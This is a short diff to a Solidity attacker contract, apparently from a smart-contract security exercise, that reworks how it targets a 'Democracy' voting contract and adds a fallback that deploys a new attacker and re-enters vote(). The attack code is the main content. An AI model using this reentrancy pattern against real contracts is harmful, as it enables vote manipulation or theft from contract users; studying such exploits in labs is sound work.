@@ -5,20 +5,23 @@ import "hardhat/console.sol";
 import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
 
 contract DemocracyAttacker {
-    Democracy public victim;
+    address public victim;
 
     constructor(address addr) payable {
-        victim = Democracy(addr);
+        victim = addr;
         // victim.mint{value: msg.value}(address(this), 22);
     }
 
     function attack() external {
         console.log("attack....");
-        victim.vote(address(0));
+        Democracy(victim).vote(address(0));
     }
 
     fallback() external payable {
         console.log("fallback....");
-        victim.vote(address(0));
+
+        DemocracyAttacker attacker2 = new DemocracyAttacker(victim);
+
+        Democracy(victim).vote(address(0));
     }
 }
